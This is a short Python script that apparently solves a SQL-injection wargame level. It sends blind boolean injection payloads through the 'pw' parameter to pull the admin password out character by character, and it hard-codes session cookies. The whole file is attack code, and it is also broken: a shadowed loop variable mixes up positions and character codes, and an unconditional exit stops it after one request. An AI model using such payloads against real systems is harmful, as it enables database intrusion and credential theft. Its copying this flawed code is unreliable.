import requests

URL = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?"
cookie = {
    "__cfduid":"d33f226e52742a4101c7fa523b51564201526036891",
    "PHPSESSID":"pm8noisi6il72p88g3vg7edh85"
    }
session1 = requests.Session()
password = ""
for i in range(8):
    for i in range(32,127):
        data="pw=1'||(id<'b')%26%26(left(pw,"+str(i+1)+")<'"+password+chr(i)+"')--'"
        req1 = session1.get(URL+data,cookies=cookie)
        print (req1.text)
        print (req1.text.find("strong"))
        exit (0)
        if req1.text.find("Hello admin") > 0 :
            password += chr(i-1)
            print (password)
            break



#pw=1'||(id<'b')%26%26(left(pw,1)<'z')--'
